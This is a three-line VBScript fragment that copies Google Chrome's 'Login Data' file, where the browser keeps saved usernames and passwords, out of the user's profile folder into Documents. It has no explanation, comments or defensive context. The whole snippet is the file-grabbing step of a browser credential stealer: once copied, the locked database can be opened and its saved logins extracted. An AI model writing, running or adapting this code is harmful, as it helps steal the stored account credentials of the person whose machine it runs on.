
Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")
FSO.CopyFile "C:\Users\USER\AppData\Local\Google\Chrome\User Data\Default\Login Data", "C:\Users\USER\Documents\Login Data"
